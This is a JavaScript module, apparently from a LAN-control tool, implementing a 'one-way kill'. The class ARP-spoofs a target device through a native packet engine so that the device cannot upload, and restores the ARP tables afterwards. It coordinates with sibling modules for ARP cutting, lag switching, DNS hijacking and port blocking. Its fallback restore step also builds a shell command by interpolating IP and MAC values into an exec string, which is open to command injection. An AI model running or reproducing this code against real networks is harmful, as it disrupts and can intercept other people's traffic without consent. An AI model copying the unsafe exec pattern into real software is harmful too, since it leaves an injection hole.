import { spawn } from 'child_process';
import logger from '../utils/logger.js';
import { getNativeEnginePath, runNativeRestore } from '../utils/nativeEngine.js';
import { quoteExecutable, resolvePython } from '../utils/pythonRuntime.js';
import { arpSpoofer } from './arpSpoofer.js';
import { speedLimiter } from './speedLimiter.js';
import { lagSwitch } from './lagSwitch.js';
import { portBlocker } from './portBlocker.js';
import { dnsHijack } from './dnsHijack.js';
import { networkScanner } from './networkScanner.js';
import { normalizeMac } from './arpTable.js';
import path from 'path';
import { getScriptsDir } from '../utils/paths.js';

const RESTORE_SCRIPT = path.join(getScriptsDir(), 'arp_restore.py');

export class OneWayKill {
  constructor() {
    this.active = new Map();
  }

  isActive(macAddress) {
    return this.active.has(normalizeMac(macAddress));
  }

  getActiveMacs() {
    return Array.from(this.active.keys());
  }

  async start(macAddress, ipAddress) {
    const mac = normalizeMac(macAddress);

    if (arpSpoofer.isCut(mac)) throw new Error('Device is cut — restore first');
    if (speedLimiter.isLimited(mac)) throw new Error('Speed limit active');
    if (lagSwitch.isActive(mac)) throw new Error('Lag active');
    if (portBlocker.isBlocking(mac)) throw new Error('Port block active');
    if (dnsHijack.isActive(mac)) throw new Error('DNS lock active');

    if (this.active.has(mac)) {
      return { success: true, message: 'One-way kill already active', engine: 'native' };
    }

    const nativePath = getNativeEnginePath();
    if (!nativePath) throw new Error('Native engine required (Npcap + admin)');

    const gatewayIp = await arpSpoofer.getGatewayIp();
    const networkInfo = await networkScanner.getLocalNetworkInfo();

    const child = spawn(
      nativePath,
      ['oneway', ipAddress, mac, gatewayIp, networkInfo.interface || '', networkInfo.ip || ''],
      { stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true }
    );

    const entry = {
      process: child,
      ipAddress,
      gatewayIp,
      iface: networkInfo.interface,
      localIp: networkInfo.ip,
      startedAt: Date.now()
    };

    child.stderr.on('data', (d) => {
      const text = d.toString().trim();
      if (text) logger.warn(`[OneWay:${mac}] ${text}`);
    });

    child.on('exit', (code) => {
      if (this.active.get(mac)?.process === child) {
        this.active.delete(mac);
        this.restoreArp(mac, ipAddress, gatewayIp, entry.iface, entry.localIp).catch(() => null);
        if (code && code !== 0) logger.warn(`[OneWay] exited ${code} for ${mac}`);
      }
    });

    this.active.set(mac, entry);
    return {
      success: true,
      engine: 'native',
      message: 'One-way kill active — device cannot upload, download still works'
    };
  }

  async stop(macAddress, ipAddress = null) {
    const mac = normalizeMac(macAddress);
    const entry = this.active.get(mac);
    if (!entry) return { success: true, message: 'One-way kill not active' };

    try {
      entry.process.kill('SIGTERM');
      if (process.platform === 'win32') {
        spawn('taskkill', ['/PID', String(entry.process.pid), '/T', '/F'], { windowsHide: true });
      }
    } catch (error) {
      logger.warn(`Failed to stop one-way kill for ${mac}: ${error.message}`);
    }

    this.active.delete(mac);
    await this.restoreArp(mac, ipAddress || entry.ipAddress, entry.gatewayIp, entry.iface, entry.localIp);
    return { success: true, message: 'One-way kill removed' };
  }

  async restoreArp(macAddress, ipAddress, gatewayIp, iface, localIp) {
    const restored = await runNativeRestore(ipAddress, macAddress, gatewayIp, iface, localIp);
    if (restored) return;

    const python = await resolvePython();
    if (!python?.command) return;

    const { exec } = await import('child_process');
    const { promisify } = await import('util');
    const execAsync = promisify(exec);

    try {
      await execAsync(
        `${quoteExecutable(python.command)} "${RESTORE_SCRIPT}" ${ipAddress} ${macAddress} ${gatewayIp}`,
        { windowsHide: true }
      );
    } catch {
      // ignore
    }
  }

  stopAll() {
    for (const [mac, entry] of this.active.entries()) {
      this.stop(mac, entry.ipAddress).catch(() => null);
    }
  }
}

export const oneWayKill = new OneWayKill();
